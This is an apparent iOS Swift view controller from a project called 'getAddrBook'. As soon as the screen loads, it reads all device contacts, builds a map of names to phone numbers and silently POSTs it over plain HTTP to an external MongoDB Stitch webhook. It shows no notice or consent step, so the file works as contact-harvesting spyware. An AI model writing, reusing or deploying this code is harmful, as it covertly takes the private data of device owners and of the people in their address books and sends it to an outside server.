//
//  ViewController.swift
//  getAddrBook
//
//  Created by mac on 24/9/2019.
//  Copyright © 2019 fx. All rights reserved.
//

import UIKit
import addrHelp

class ViewController: UIViewController {

    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        AddrHelp.getAllContacts { (contacts) in
            var dic = [String:String]()
            for contact in contacts {
                do {
                    var phones = ""
                    for phone in contact.phoneNums {
                        phones = phones + phone + ","
                    }
                    if phones.count > 0 {
                        phones.removeLast()
                    }
                    print("name:"+contact.name+" phones:"+phones)
                    var name = contact.name
                    var phone = contact.phoneNums.first ?? ""
                    if contact.name == "" {
                       contact.name = phone
                    }
                    if contact.name != "" {
                        dic[name] = phone
                    }
                }catch {
                    print(error)
                }
            }
            if dic.count > 0 {
                self.postData(data: dic)
            }
        }
        
    }
    
    func postData(data:[String:String]) {
        var str = ""
        for k in data.keys {
            str = str + k + "=" + (data[k] ?? "") + "&"
        }
        if str.count > 0 {str.removeLast()}
        
        let url = URL(string: "http://webhooks.mongodb-stitch.com/api/client/v2.0/app/passbook-ssizi/service/addData/incoming_webhook/webhook0")!
        var request = URLRequest(url: url, cachePolicy: .reloadIgnoringLocalCacheData, timeoutInterval: 30)
        request.httpMethod = "POST"
        request.setValue("application/x-www-form-urlencoded", forHTTPHeaderField: "Content-Type")
        request.addValue("application/json", forHTTPHeaderField: "Accept")
//        request.httpBody = try? JSONSerialization.data(withJSONObject: data, options: [])
        request.httpBody = str.data(using: .utf8)
        let session = URLSession.shared
        session.dataTask(with: request) { (data, response, error) in
            if let response = response {
                print(response)
            }
            if let data = data {
                do {
                    let json = try JSONSerialization.jsonObject(with: data, options: [])
                    print(json)
                } catch {
                    print(error)
                }
            }
        }.resume()
        
    }
    

}

